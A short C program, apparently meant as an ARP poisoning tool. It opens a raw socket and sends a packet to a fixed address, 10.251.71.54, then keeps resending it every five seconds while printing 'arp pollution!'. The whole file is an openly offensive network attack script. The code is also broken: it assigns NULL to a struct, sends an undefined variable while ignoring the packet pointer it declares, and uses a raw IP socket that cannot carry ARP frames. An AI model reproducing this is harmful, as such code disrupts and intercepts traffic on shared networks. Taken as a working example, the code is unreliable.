#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

#include "pckt_header.h"

int main(void) {
	int sock = socket(PF_INET, SOCK_RAW, 255);
	struct sockaddr_in dst_in = NULL;
	ARP_PACKET *attack_arp_packet = NULL;

	if(sock < 0) {
		perror("socket() error");
		return -1;
	}

	//set destination information
	dst_in.sin_family = AF_INET;
	dst_in.sin_port = 0;
	dst_in.sin_addr.s_addr = inet_addr("10.251.71.54");
	//

	if(sendto(sock, &arp_hdr, sizeof(arp_hdr), 0, (struct sockaddr*)&dst_in, sizeof(dst_in)) < 0) {
		perror("sendto() error");
		return -1;
	}

	while(1) {
		printf("arp pollution!\n");
		sendto(sock, &arp_hdr, sizeof(arp_hdr), 0, (struct sockaddr*)&dst_in, sizeof(dst_in));
		sleep(5);
	}

	printf("program exit!\n");
	return 0;
}
